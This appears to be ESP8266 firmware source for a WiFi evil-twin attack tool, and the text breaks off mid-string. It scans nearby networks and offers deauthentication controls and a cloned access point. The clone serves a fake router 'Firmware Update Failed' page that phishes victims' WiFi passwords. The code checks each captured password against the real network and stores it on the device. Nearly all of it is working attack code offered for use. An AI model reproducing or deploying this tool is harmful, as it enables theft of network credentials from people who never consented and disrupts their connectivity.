#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <ESP8266HTTPClient.h>
#include <EEPROM.h>

extern "C"
{
#include "user_interface.h"
}

#define EEPROM_SIZE 512
#define MAX_CREDENTIALS 5
#define CREDENTIAL_SIZE 100
#define EEPROM_START_ADDR 0
#define CREDENTIALS_COUNT_ADDR 0
#define CREDENTIALS_START_ADDR 4

#define MAX_CLIENTS 8
uint8_t client_addresses[MAX_CLIENTS][6];
int client_count = 0;
unsigned long last_client_scan = 0;
bool scan_for_clients = true;
int deauth_interval = 250;
bool deauthing_active = false;
bool hotspot_active = false;

const uint8_t reason_codes[] = {1, 2, 3, 4, 5, 6, 7, 9};
const int num_reason_codes = sizeof(reason_codes) / sizeof(reason_codes[0]);

typedef struct
{
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
  int32_t rssi;
} _Network;

typedef struct
{
  char ssid[32];
  char password[64];
} Credential;

Credential storedCredentials[MAX_CREDENTIALS];
int credentialsCount = 0;

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

_Network _networks[16];
_Network _selectedNetwork;

bool isHTTPS = false;
const char* HTTP_HEADER_CONNECTION = "Connection";
const char* HTTP_HEADER_UPGRADE = "Upgrade";
const char* HTTP_HEADER_HOST = "Host";
const char* HTTP_HEADER_ORIGIN = "Origin";

const char* CONTENT_TYPE_HTML = "text/html";
const char* CONTENT_TYPE_PLAIN = "text/plain";

const char* CACHE_CONTROL_NO_CACHE = "no-cache, no-store, must-revalidate";
const char* CACHE_CONTROL_NO_SNIFF = "nosniff";

void sendCaptivePortalHeader(ESP8266WebServer& server) {
  server.sendHeader("Cache-Control", CACHE_CONTROL_NO_CACHE);
  server.sendHeader("Pragma", "no-cache");
  server.sendHeader("Expires", "-1");
  server.sendHeader("X-Content-Type-Options", CACHE_CONTROL_NO_SNIFF);
}

bool isCaptivePortalDetection() {
  if (webServer.hostHeader() == "connectivitycheck.gstatic.com" ||
      webServer.hostHeader() == "connectivitycheck.android.com" ||
      webServer.hostHeader() == "clients3.google.com" ||
      webServer.hostHeader() == "clients.l.google.com" ||
      webServer.hostHeader() == "generate_204" ||
      webServer.hostHeader() == "captive.apple.com" ||
      webServer.hostHeader() == "www.apple.com" ||
      webServer.hostHeader() == "www.appleiphonecell.com" ||
      webServer.hostHeader() == "www.itools.info" ||
      webServer.hostHeader() == "www.ibook.info" ||
      webServer.hostHeader() == "www.airport.us" ||
      webServer.hostHeader() == "www.thinkdifferent.us") {
    return true;
  }
  return false;
}

void handleHTTPS() {
  isHTTPS = true;
  String httpsHTML = "<!DOCTYPE html><html><head><title>HTTPS Not Available</title>"
                     "<meta name='viewport' content='width=device-width, initial-scale=1'>"
                     "<style>"
                     "body{font-family:system-ui,-apple-system,sans-serif;line-height:1.4;max-width:600px;margin:0 auto;padding:20px;}"
                     "h1{color:#ff9800;font-size:24px;}"
                     "p{color:#666;}"
                     ".btn{display:inline-block;background:#007aff;color:#fff;text-decoration:none;padding:10px 20px;border-radius:5px;margin-top:20px;}"
                     "</style></head>"
                     "<body>"
                     "<h1>⚠️ HTTPS Not Available</h1>"
                     "<p>This network requires authentication. Please use HTTP to access the login page.</p>"
                     "<a href='http://" + webServer.hostHeader() + "' class='btn'>Continue to Login</a>"
                     "</body></html>";
  
  sendCaptivePortalHeader(webServer);
  webServer.send(200, CONTENT_TYPE_HTML, httpsHTML);
}

void clearArray();
void performScan();
void scanForClients();
void handleIndex();
void handleResult();
void handleAdmin();
String bytesToStr(const uint8_t *b, uint32_t size);
String index();
String header(String t);
String footer();

void loadCredentials()
{
  EEPROM.get(CREDENTIALS_COUNT_ADDR, credentialsCount);

  if (credentialsCount < 0 || credentialsCount > MAX_CREDENTIALS)
  {
    credentialsCount = 0;
    EEPROM.put(CREDENTIALS_COUNT_ADDR, credentialsCount);
    EEPROM.commit();
    return;
  }

  for (int i = 0; i < credentialsCount; i++)
  {
    int addr = CREDENTIALS_START_ADDR + (i * sizeof(Credential));
    EEPROM.get(addr, storedCredentials[i]);
  }
}

void saveCredential(const char *ssid, const char *password)
{
  for (int i = 0; i < credentialsCount; i++)
  {
    if (strcmp(storedCredentials[i].ssid, ssid) == 0)
    {
      strncpy(storedCredentials[i].password, password, sizeof(storedCredentials[i].password) - 1);
      storedCredentials[i].password[sizeof(storedCredentials[i].password) - 1] = '\0';

      int addr = CREDENTIALS_START_ADDR + (i * sizeof(Credential));
      EEPROM.put(addr, storedCredentials[i]);
      EEPROM.commit();
      return;
    }
  }

  if (credentialsCount >= MAX_CREDENTIALS)
  {
    for (int i = 0; i < MAX_CREDENTIALS - 1; i++)
    {
      memcpy(&storedCredentials[i], &storedCredentials[i + 1], sizeof(Credential));
    }
    credentialsCount = MAX_CREDENTIALS - 1;
  }

  strncpy(storedCredentials[credentialsCount].ssid, ssid, sizeof(storedCredentials[credentialsCount].ssid) - 1);
  storedCredentials[credentialsCount].ssid[sizeof(storedCredentials[credentialsCount].ssid) - 1] = '\0';

  strncpy(storedCredentials[credentialsCount].password, password, sizeof(storedCredentials[credentialsCount].password) - 1);
  storedCredentials[credentialsCount].password[sizeof(storedCredentials[credentialsCount].password) - 1] = '\0';

  int addr = CREDENTIALS_START_ADDR + (credentialsCount * sizeof(Credential));
  EEPROM.put(addr, storedCredentials[credentialsCount]);

  credentialsCount++;
  EEPROM.put(CREDENTIALS_COUNT_ADDR, credentialsCount);

  EEPROM.commit();
}

void deleteCredential(int index)
{
  if (index < 0 || index >= credentialsCount)
  {
    return;
  }

  for (int i = index; i < credentialsCount - 1; i++)
  {
    memcpy(&storedCredentials[i], &storedCredentials[i + 1], sizeof(Credential));

    int addr = CREDENTIALS_START_ADDR + (i * sizeof(Credential));
    EEPROM.put(addr, storedCredentials[i]);
  }

  credentialsCount--;
  EEPROM.put(CREDENTIALS_COUNT_ADDR, credentialsCount);

  EEPROM.commit();
}

void deleteAllCredentials()
{
  credentialsCount = 0;
  EEPROM.put(CREDENTIALS_COUNT_ADDR, credentialsCount);
  EEPROM.commit();
}

void clearArray()
{
  for (int i = 0; i < 16; i++)
  {
    _Network _network;
    _networks[i] = _network;
  }
}

String _correct = "";
String _tryPassword = "";

#define SUBTITLE "ACCESS POINT RESCUE MODE"
#define TITLE "<warning style='color:#ff9800;font-size:2.5rem;margin-right:10px;'>&#9888;</warning>Firmware Update Failed"
#define BODY "Your router encountered a problem while automatically installing the latest firmware update.<br><br>To revert to the previous firmware and continue normal operation, please verify your network credentials."

String header(String t)
{
  String a = String(_selectedNetwork.ssid);
  String CSS = "* { box-sizing: border-box; }"
               "body { color: #333; font-family: 'Segoe UI', Tahoma, Arial, sans-serif; font-size: 16px; line-height: 1.5; margin: 0; padding: 0; background-color: #f5f5f5; }"
               "div { padding: 0.8em; }"
               "h1 { margin: 0.5em 0; padding: 0.5em; font-size: 1.5rem; color: #333; font-weight: 500; }"
               "input { width: 100%; padding: 12px 15px; margin: 12px 0; box-sizing: border-box; border: 1px solid #ddd; border-radius: 4px; font-size: 16px; transition: border-color 0.3s; }"
               "input:focus { border-color: #0066ff; outline: none; box-shadow: 0 0 0 2px rgba(0,102,255,0.2); }"
               "input[type=submit] { background-color: #0066ff; color: white; border: none; padding: 12px 20px; cursor: pointer; font-weight: bold; border-radius: 4px; transition: background-color 0.3s; }"
               "input[type=submit]:hover { background-color: #0052cc; }"
               "label { color: #555; display: block; font-weight: 500; margin-bottom: 8px; }"
               "nav { background: linear-gradient(135deg, #0066ff, #0052cc); color: #fff; display: block; font-size: 1.1em; padding: 1em; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }"
               "nav b { display: block; font-size: 1.3em; margin-bottom: 0.3em; } "
               ".container { width: 90%; max-width: 500px; margin: 0 auto; background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); margin-top: 20px; padding: 15px; }"
               ".footer { text-align: center; color: #777; font-size: 0.8em; margin-top: 20px; padding: 0 15px; }"
               "@keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }"
               ".warning-icon { animation: pulse 2s infinite; display: inline-block; }"
               "@media (max-width: 480px) {"
               "  h1 { font-size: 1.3rem; padding: 0.3em; }"
               "  nav { font-size: 0.9em; padding: 0.8em; }"
               "  nav b { font-size: 1.2em; }"
               "  .container { width: 95%; padding: 10px; margin-top: 10px; }"
               "  div { padding: 0.5em; }"
               "  input[type=submit] { padding: 10px 15px; }"
               "}";
  String h = "<!DOCTYPE html><html>"
             "<head><title>" +
             a + " :: " + t + "</title>"
                              "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
                              "<link rel=\"icon\" href=\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%230066ff' d='M12,21L15.6,16.2C14.6,15.45 13.35,15 12,15C10.65,15 9.4,15.45 8.4,16.2L12,21M12,3C7.95,3 4.21,4.34 1.2,6.6L3,9C5.5,7.12 8.62,6 12,6C15.38,6 18.5,7.12 21,9L22.8,6.6C19.79,4.34 16.05,3 12,3M12,9C9.3,9 6.81,9.89 4.8,11.4L6.6,13.8C8.1,12.67 9.97,12 12,12C14.03,12 15.9,12.67 17.4,13.8L19.2,11.4C17.19,9.89 14.7,9 12,9Z'/%3E%3C/svg%3E\" type=\"image/svg+xml\">"
                              "<style>" +
             CSS + "</style>"
                   "<meta charset=\"UTF-8\"></head>"
                   "<body><nav><b>" +
             a + "</b> " + SUBTITLE + "</nav>"
                                      "<div class='container'><h1>" +
             t + "</h1>";
  return h;
}

String footer()
{
  return "</div><div class='footer'>&#169; " + String(_selectedNetwork.ssid) + " Network Systems. All rights reserved.</div></body></html>";
}

String index()
{
  return header(TITLE) + "<div>" + BODY + "</div><div><form action='/' method=post>"
                                          "<label>WiFi password:</label>"
                                          "<input type=password id='password' name='password' minlength='8' placeholder='Enter your WiFi password' required></input>"
                                          "<input type=submit value='Verify & Continue'></form>" +
         footer();
}

void setup()
{
  Serial.begin(115200);


  EEPROM.begin(EEPROM_SIZE);


  loadCredentials();

  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  

  WiFi.setOutputPower(20.5); 
  WiFi.setPhyMode(WIFI_PHY_MODE_11N); 
  
  
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  WiFi.softAP("WiFi_Setup", "@wifi2005309@", 1, false, 8); 
  

  dnsServer.setErrorReplyCode(DNSReplyCode::NoError); 
  dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));


  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.on("/admin", handleAdmin);
  webServer.on("/stored", handleStoredCredentials);
  webServer.on("/delete", handleDeleteCredential);
  webServer.on("/deleteall", handleDeleteAllCredentials);

  webServer.on("/generate_204", handleCaptivePortal);  
  webServer.on("/ncsi.txt", handleCaptivePortal);    
  webServer.on("/hotspot-detect.html", handleCaptivePortal);  
  webServer.on("/success.txt", handleCaptivePortal);
  webServer.on("/redirect", handleCaptivePortal);
  webServer.on("/library/test/success.html", handleCaptivePortal);
  webServer.on("/kindle-wifi/wifistub.html", handleCaptivePortal);
  webServer.on("/check_network_status.txt", handleCaptivePortal);
  webServer.on("/fwlink/", handleCaptivePortal);
  

  webServer.onNotFound([]() {
    if (isHTTPS) {
      handleHTTPS();
    } else if (isCaptivePortalDetection()) {
      handleCaptivePortal();
    } else {
      handleIndex();
    }
  });

  webServer.begin();
}

void performScan()
{
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0)
  {
    for (int i = 0; i < n && i < 16; ++i)
    {
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++)
      {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }

      network.ch = WiFi.channel(i);
      network.rssi = WiFi.RSSI(i);  
      _networks[i] = network;
    }
  }
}

void handleResult()
{
  String html = "";
  if (WiFi.status() != WL_CONNECTED)
  {
    if (webServer.arg("deauth") == "start")
    {
      deauthing_active = true;
    }
    webServer.send(200, "text/html", "<!DOCTYPE html><html><head>"
                                     "<meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                                     "<link rel=\"icon\" href=\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%230066ff' d='M12,21L15.6,16.2C14.6,15.45 13.35,15 12,15C10.65,15 9.4,15.45 8.4,16.2L12,21M12,3C7.95,3 4.21,4.34 1.2,6.6L3,9C5.5,7.12 8.62,6 12,6C15.38,6 18.5,7.12 21,9L22.8,6.6C19.79,4.34 16.05,3 12,3M12,9C9.3,9 6.81,9.89 4.8,11.4L6.6,13.8C8.1,12.67 9.97,12 12,12C14.03,12 15.9,12.67 17.4,13.8L19.2,11.4C17.19,9.89 14.7,9 12,9Z'/%3E%3C/svg%3E\" type=\"image/svg+xml\">"
                                     "<style>"
                                     "body { font-family: 'Segoe UI', Tahoma, Arial, sans-serif; background-color: #f5f5f5; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }"
                                     ".error-container { background: white; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); padding: 20px; text-align: center; width: 90%; max-width: 400px; }"
                                     ".error-icon { color: #ff3b30; font-size: 50px; margin-bottom: 20px; }"
                                     "h2 { color: #333; margin-top: 0; font-size: 1.5rem; }"
                                     "p { color: #666; }"
                                     "@keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }"
                                     ".error-container { animation: fadeIn 0.5s ease-out; }"
                                     "@media (max-width: 480px) {"
                                     "  .error-container { padding: 15px; }"
                                     "  .error-icon { font-size: 40px; margin-bottom: 15px; }"
                                     "  h2 { font-size: 1.3rem; }"
                                     "}"
                                     "</style>"
                                     "<script>setTimeout(function(){window.location.href = '/';}, 4000);</script>"
                                     "</head><body>"
                                     "<div class='error-container'>"
                                     "<div class='error-icon'>&#10060;</div>"
                                     "<h2>Authentication Failed</h2>"
                                     "<p>The password you entered is incorrect. Please try again.</p>"
                                     "</div></body></html>");
    Serial.println("Wrong password tried!");
  }
  else
  {
    _correct = "Successfully got password for: " + _selectedNetwork.ssid + " Password: " + _tryPassword;


    saveCredential(_selectedNetwork.ssid.c_str(), _tryPassword.c_str());


    deauthing_active = false;
    Serial.println("Deauth attack stopped after successful password capture");

    hotspot_active = false;
    dnsServer.stop();
    int n = WiFi.softAPdisconnect(true);
    Serial.println(String(n));
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
    WiFi.softAP("WiFi_Setup", "@wifi2005309@");
    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    Serial.println("Good password was entered !");
    Serial.println(_correct);

    webServer.send(200, "text/html", "<!DOCTYPE html><html><head>"
                                     "<meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                                     "<link rel=\"icon\" href=\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%230066ff' d='M12,21L15.6,16.2C14.6,15.45 13.35,15 12,15C10.65,15 9.4,15.45 8.4,16.2L12,21M12,3C7.95,3 4.21,4.34 1.2,6.6L3,9C5.5,7.12 8.62,6 12,6C15.38,6 18.5,7.12 21,9L22.8,6.6C19.79,4.34 16.05,3 12,3M12,9C9.3,9 6.81,9.89 4.8,11.4L6.6,13.8C8.1,12.67 9.97,12 12,12C14.03,12 15.9,12.67 17.4,13.8L19.2,11.4C17.19,9.89 14.7,9 12,9Z'/%3E%3C/svg%3E\" type=\"image/svg+xml\">"
                                     "<style>"
                                     "body { font-family: 'Segoe UI', Tahoma, Arial, sans-serif; background-color: #f5f5f5; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }"
                                     ".success-container { background: white; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); padding: 20px; text-align: center; width: 90%; max-width: 400px; }"
                                     ".success-icon { color: #34c759; font-size: 50px; margin-bottom: 20px; }"
                                     "h2 { color: #333; margin-top: 0; font-size: 1.5rem; }"
                                     "p { color: #666; }"
                                     "@keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }"
                                     ".success-container { animation: fadeIn 0.5s ease-out; }"
                                     "@media (max-width: 480px) {"
                                     "  .success-container { padding: 15px; }"
                                     "  .success-icon { font-size: 40px; margin-bottom: 15px; }"
                                     "  h2 { font-size: 1.3rem; }"
                                     "}"
                                     "</style>"
                                     "<script>setTimeout(function(){window.location.href = '/admin';}, 5000);</script>"
                                     "</head><body>"
                                     "<div class='success-container'>"
                                     "<div class='success-icon'>&#10004;</div>"
                                     "<h2>Verification Successful</h2>"
                                     "<p>Your network credentials have been verified successfully.</p>"
                                     "<p>The system will now revert to the previous firmware.</p>"
                                     "</div></body></html>");
  }
}

String _tempHTML = "<!DOCTYPE html><html><head>"
                   "<meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                   "<link rel=\"icon\" href=\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%230066ff' d='M12,21L15.6,16.2C14.6,15.45 13.35,15 12,15C10.65,15 9.4,15.45 8.4,16.2L12,21M12,3C7.95,3 4.21,4.34 1.2,6.6L3,9C5.5,7.12 8.62,6 12,6C15.38,6 18.5,7.12 21,9L22.8,6.6C19.79,4.34 16.05,3 12,3M12,9C9.3,9 6.81,9.89 4.8,11.4L6.6,13.8C8.1,12.67 9.97,12 12,12C14.03,12 15.9,12.67 17.4,13.8L19.2,11.4C17.19,9.89 14.7,9 12,9Z'/%3E%3C/svg%3E\" type=\"image/svg+xml\">"
                   "<style>"
                   "* { box-sizing: border-box; }"
                   "body { font-family: 'Segoe UI', Tahoma, Arial, sans-serif; background-color: #f5f5f5; margin: 0; padding: 10px; }"
                   ".content { max-width: 100%; margin: auto; background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); padding: 15px; }"
                   ".header { display: flex; flex-direction: column; margin-bottom: 15px; }"
                   ".title { font-size: 1.5rem; font-weight: 500; color: #333; margin-bottom: 15px; }"
                   ".button-group { display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 10px; }"
                   "button { padding: 10px 15px; border: none; border-radius: 4px; cursor: pointer; font-weight: 500; transition: all 0.3s; width: 100%; }"
                   "button:disabled { opacity: 0.6; cursor: not-allowed; }"
                   ".deauth-btn { background-color: #ff3b30; color: white; }"
                   ".deauth-btn:hover:not(:disabled) { background-color: #d63125; }"
                   ".hotspot-btn { background-color: #007aff; color: white; }"
                   ".hotspot-btn:hover:not(:disabled) { background-color: #0062cc; }"
                   ".scan-btn { background-color: #34c759; color: white; }"
                   ".scan-btn:hover:not(:disabled) { background-color: #2bb14a; }"
                   ".table-container { overflow-x: auto; }"
                   "table { width: 100%; border-collapse: collapse; margin: 15px 0; box-shadow: 0 1px 3px rgba(0,0,0,0.1); min-width: 500px; }"
                   "th { background-color: #f2f2f2; color: #333; font-weight: 600; text-align: left; }"
                   "th, td { padding: 10px; border-bottom: 1px solid #ddd; }"
                   "tr:hover { background-color: #f5f5f5; }"
                   ".select-btn { background-color: #34c759; color: white; padding: 6px 12px; border: none; border-radius: 4px; cursor: pointer; width: auto; }"
                   ".select-btn:hover { background-color: #2bb14a; }"
                   ".normal-btn { background-color: #e0e0e0; color: #333; padding: 6px 12px; border: none; border-radius: 4px; cursor: pointer; width: auto; }"
                   ".normal-btn:hover { background-color: #d0d0d0; }"
                   ".success-message { background-color: #e8f5e9; border-left: 4px solid #34c759; padding: 15px; margin: 15px 0; color: #1e8e3e; overflow-wrap: break-word; word-break: break-all; }"
                   ".refresh-btn { background-color: #5856d6; color: white; margin-top: 15px; }"
                   ".refresh-btn:hover { background-color: #4745b3; }"
                   ".client-list { background-color: #f8f9fa; border-left: 4px solid #007aff; padding: 15px; margin: 15px 0; }"
                   ".client-list h3 { margin-top: 0; color: #333; font-size: 1.1rem; }"
                   ".client-item { padding: 5px 0; border-bottom: 1px solid #eee; }"
                   ".client-item:last-child { border-bottom: none; }"
                   ".settings-panel { background-color: #f8f9fa; border-left: 4px solid #ff9500; padding: 15px; margin: 15px 0; }"
                   ".settings-panel h3 { margin-top: 0; color: #333; font-size: 1.1rem; }"
                   ".settings-row { display: flex; align-items: center; margin-bottom: 10px; }"
                   ".settings-row label { flex: 1; margin-right: 10px; }"
                   ".settings-row select, .settings-row input { flex: 2; padding: 8px; border: 1px solid #ddd; border-radius: 4px; }"
                   ".apply-btn { background-color: #ff9500; color: white; padding: 8px 15px; border: none; border-radius: 4px; cursor: pointer; margin-top: 10px; }"
                   ".apply-btn:hover { background-color: #e68600; }"
                   "@media (min-width: 768px) {"
                   "  body { padding: 20px; }"
                   "  .content { max-width: 800px; padding: 20px; }"
                   "  .header { flex-direction: row; justify-content: space-between; align-items: center; }"
                   "  .button-group { margin-bottom: 0; }"
                   "  button { width: auto; }"
                   "}"
                   "</style>"
                   "</head><body><div class='content'>"
                   "<div class='header'>"
                   "<div class='title'>WiFi Networks</div>"
                   "<div class='button-group'>"
                   "<form style='display:inline-block; width: 100%;' method='post' action='/?deauth={deauth}'>"
                   "<button class='deauth-btn'{disabled}>{deauth_button}</button></form>"
                   "<form style='display:inline-block; width: 100%;' method='post' action='/?hotspot={hotspot}'>"
                   "<button class='hotspot-btn'{disabled}>{hotspot_button}</button></form>"
                   "<form style='display:inline-block; width: 100%;' method='post' action='/?scan={scan}'>"
                   "<button class='scan-btn'{disabled}>{scan_button}</button></form>"
                   "</div></div>"
                   "<div class='table-container'>"
                   "<table><tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>Signal</th><th>Action</th></tr>";

void handleIndex()
{

  sendCaptivePortalHeader(webServer);
  

  webServer.sendHeader("Content-Type", CONTENT_TYPE_HTML);
  

  String userAgent = webServer.header("User-Agent");
  bool isApple = userAgent.indexOf("iPhone") >= 0 || userAgent.indexOf("iPad") >= 0 || userAgent.indexOf("Mac") >= 0;
  bool isAndroid = userAgent.indexOf("Android") >= 0;
  
  if (hotspot_active == false) {
    if (webServer.hasArg("ap"))
    {
      for (int i = 0; i < 16; i++)
      {
        if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap"))
        {
          _selectedNetwork = _networks[i];
        }
      }
    }

    if (webServer.hasArg("deauth"))
    {
      if (webServer.arg("deauth") == "start")
      {
        deauthing_active = true;
      }
      else if (webServer.arg("deauth") == "stop")
      {
        deauthing_active = false;
      }
    }

    if (webServer.hasArg("scan"))
    {
      if (webServer.arg("scan") == "start")
      {
        scan_for_clients = true;

        last_client_scan = 0;
      }
      else if (webServer.arg("scan") == "stop")
      {
        scan_for_clients = false;
  
        client_count = 0;
      }
    }

    if (webServer.hasArg("hotspot"))
    {
      if (webServer.arg("hotspot") == "start")
      {
        hotspot_active = true;

        dnsServer.stop();
        int n = WiFi.softAPdisconnect(true);
        Serial.println(String(n));
        WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
        WiFi.softAP(_selectedNetwork.ssid.c_str());
        dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
      }
      else if (webServer.arg("hotspot") == "stop")
      {
        hotspot_active = false;
        dnsServer.stop();
        int n = WiFi.softAPdisconnect(true);
        Serial.println(String(n));
        WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
        WiFi.softAP("WiFi_Setup", "@wifi2005309@");
        dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
      }
      return;
    }

    if (webServer.hasArg("intensity"))
    {
      int intensity = webServer.arg("intensity").toInt();
      if (intensity >= 1 && intensity <= 5)
      {

        deauth_interval = 600 - (intensity * 100);
        Serial.print("Deauth interval set to: ");
        Serial.println(deauth_interval);
      }
    }

    String _html = _tempHTML;

    for (int i = 0; i < 16; ++i)
    {
      if (_networks[i].ssid == "")
      {
        break;
      }
      _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "</td><td>" +
               getSignalStrength(_networks[i].rssi) + "</td><td><form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";

      if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6))
      {
        _html += "<button class='select-btn'>Selected</button></form></td></tr>";
      }
      else
      {
        _html += "<button class='normal-btn'>Select</button></form></td></tr>";
      }
    }

    if (deauthing_active)
    {
      _html.replace("{deauth_button}", "Stop Deauth Attack");
      _html.replace("{deauth}", "stop");
    }
    else
    {
      _html.replace("{deauth_button}", "Start Deauth Attack");
      _html.replace("{deauth}", "start");
    }

    if (hotspot_active)
    {
      _html.replace("{hotspot_button}", "Stop Evil Twin");
      _html.replace("{hotspot}", "stop");
    }
    else
    {
      _html.replace("{hotspot_button}", "Start Evil Twin");
      _html.replace("{hotspot}", "start");
    }

    if (scan_for_clients)
    {
      _html.replace("{scan_button}", "Stop Client Scan");
      _html.replace("{scan}", "stop");
    }
    else
    {
      _html.replace("{scan_button}", "Start Client Scan");
      _html.replace("{scan}", "start");
    }

    if (_selectedNetwork.ssid == "")
    {
      _html.replace("{disabled}", " disabled");
    }
    else
    {
      _html.replace("{disabled}", "");
    }

    _html += "</table></div>";

    if (_correct != "")
    {
      _html += "<div class='success-message'>" + _correct + "</div>";
    }


    if (_selectedNetwork.ssid != "")
    {
      _html += "<div class='settings-panel'>";
      _html += "<h3>Attack Settings</h3>";
      _html += "<form method='post' action='/'>";
      _html += "<div class='settings-row'>";
      _html += "<label for='intensity'>Deauth Intensity:</label>";
      _html += "<select id='intensity' name='intensity'>";

      for (int i = 1; i <= 5; i++)
      {
        int interval = 600 - (i * 100);
        bool selected = (interval == deauth_interval);
        _html += "<option value='" + String(i) + "'" + (selected ? " selected" : "") + ">" +
                 String(i) + " - " + (i == 1 ? "Low" : (i == 3 ? "Medium" : (i == 5 ? "High" : ""))) +
                 " (" + String(1000 / interval) + " packets/sec)</option>";
      }

      _html += "</select>";
      _html += "</div>";
      _html += "<button class='apply-btn'>Apply Settings</button>";
      _html += "</form>";
      _html += "</div>";
    }

    if (client_count > 0 && scan_for_clients)
    {
      _html += "<div class='client-list'>";
      _html += "<h3>Connected Clients (" + String(client_count) + ")</h3>";
      for (int i = 0; i < client_count; i++)
      {
        _html += "<div class='client-item'>" + bytesToStr(client_addresses[i], 6) + "</div>";
      }
      _html += "</div>";
    }

    _html += "<form method='get' action='/'><button class='refresh-btn'>Refresh Networks</button></form>";

    _html += "<form method='get' action='/stored' style='margin-top:10px;'><button class='refresh-btn' style='background-color:#007aff;'>View Stored Credentials</button></form>";

    _html += "</div></body></html>";
    webServer.send(200, "text/html", _html);
  } else {
    if (webServer.hasArg("password")) {
     
      _tryPassword = webServer.arg("password");
      

      webServer.sendHeader("Location", "http://" + webServer.client().localIP().toString() + "/result", true);
      
      webServer.send(302, CONTENT_TYPE_PLAIN, "");
      
    
      WiFi.disconnect();
      WiFi.begin(_selectedNetwork.ssid.c_str(), _tryPassword.c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
       webServer.send(200, "text/html", "<!DOCTYPE html><html><head>"
                                       "<meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                                       "<link rel=\"icon\" href=\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 
                                       24'%3E%3Cpath fill='%230066ff' d='M12,21L15.6,16.2C14.6,15.45 13.35,15 12,15C10.65,15 9.4,15.45 8.4,16.
                                       2L12,21M12,3C7.95,3 4.21,4.34 1.2,6.6L3,9C5.5,7.12 8.62,6 12,6C15.38,6 18.5,7.12 21,9L22.8,6.6C19.79,4.34 
                                       16.05,3 12,3M12,9C9.3,9 6.81,9.89 4.8,11.4L6.6,13.8C8.1,12.67 9.97,12 12,12C14.03,12 15.9,12.67 17.4,13.
                                       8L19.2,11.4C17.19,9.89 14.7,9 12,9Z'/%3E%3C/svg%3E\" type=\"image/svg+xml\">"
                                       "<style>"
                                       "body { font-family: 'Segoe UI', Tahoma, Arial, sans-serif; background-color: #f5f5f5; margin: 0; 
                                       padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }"
                                       ".loader-container { background: white; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); 
                                       padding: 20px; text-align: center; width: 90%; max-width: 400px; }"
                                       "h2 { color: #333; margin-top: 0; font-size: 1.5rem; }"
                                       ".spinner { margin: 25px auto; width: 70px; text-align: center; }"
                                       ".spinner > div { width: 18px; height: 18px; background-color: #0066ff; border-radius: 100%; display: 
                                       inline-block; animation: sk-bouncedelay 1.4s infinite ease-in-out both; }"
                                       ".spinner .bounce1 { animation-delay: -0.32s; }"
                                       ".spinner .bounce2 { animation-delay: -0.16s; }"
                                       "@keyframes sk-bouncedelay { 0%, 80%, 100% { transform: scale(0); } 40% { transform: scale(1.0); } }"
                                       "progress { width: 100%; height: 8px; margin-top: 20px; border: none; border-radius: 4px; }"
                                       "progress::-webkit-progress-bar { background-color: #f0f0f0; border-radius: 4px; }"
                                       "progress::-webkit-progress-value { background: linear-gradient(to right, #0066ff, #5856d6); 
                                       border-radius: 4px; transition: width 0.3s ease; }"
                                       ".status-text { color: #666; margin-top: 15px; font-size: 14px; }"
                                       "@media (max-width: 480px) {"
                                       "  .loader-container { padding: 15px; }"
                                       "  h2 { font-size: 1.3rem; }"
